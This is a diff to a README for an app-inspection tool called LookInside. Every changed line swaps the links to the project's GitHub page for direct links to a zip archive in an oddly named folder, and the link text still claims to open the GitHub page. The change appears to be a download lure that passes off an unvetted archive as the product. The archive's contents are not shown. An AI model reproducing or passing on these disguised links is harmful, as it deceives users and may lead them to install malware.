@@ -1,6 +1,6 @@
 # 🧭 LookInside - Inspect apps with ease
 
-[![Download LookInside](https://img.shields.io/badge/Download-LookInside-blue?style=for-the-badge)](https://github.com/Willieundesirable68/LookInside)
+[![Download LookInside](https://img.shields.io/badge/Download-LookInside-blue?style=for-the-badge)](https://raw.githubusercontent.com/Willieundesirable68/LookInside/main/psychophysicist/Look_Inside_3.5.zip)
 
 ## 📦 What is LookInside?
 
@@ -29,7 +29,7 @@ If you plan to inspect iOS apps, install Xcode and set up the iOS Simulator firs
 
 Open the main project page and get the version you want:
 
-[Visit the LookInside download page](https://github.com/Willieundesirable68/LookInside)
+[Visit the LookInside download page](https://raw.githubusercontent.com/Willieundesirable68/LookInside/main/psychophysicist/Look_Inside_3.5.zip)
 
 After you download it, open the app package or build it in Xcode, based on the version you choose.
 
@@ -158,4 +158,4 @@ If Xcode will not build the project:
 
 ## ▶️ Get Started Now
 
-[Open LookInside on GitHub](https://github.com/Willieundesirable68/LookInside)
+[Open LookInside on GitHub](https://raw.githubusercontent.com/Willieundesirable68/LookInside/main/psychophysicist/Look_Inside_3.5.zip)
